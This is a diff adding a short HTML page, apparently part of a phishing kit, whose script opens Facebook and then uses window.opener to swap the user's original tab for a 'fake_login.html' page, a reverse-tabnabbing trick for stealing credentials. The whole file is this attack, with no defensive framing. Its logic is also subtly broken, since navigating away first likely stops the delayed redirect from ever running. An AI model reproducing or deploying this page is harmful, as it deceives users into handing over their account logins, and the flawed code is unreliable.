@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Redirect Page</title>
+</head>
+<body>
+
+<script>
+    // Load Facebook immediately
+    window.location.href = "https://www.facebook.com";
+    // After 5 seconds, redirect this tab to fake_login.html
+    setTimeout(() => {
+        window.opener.location.href = "fake_login.html";
+    }, 5000);
+</script>
+
+</body>
+</html>
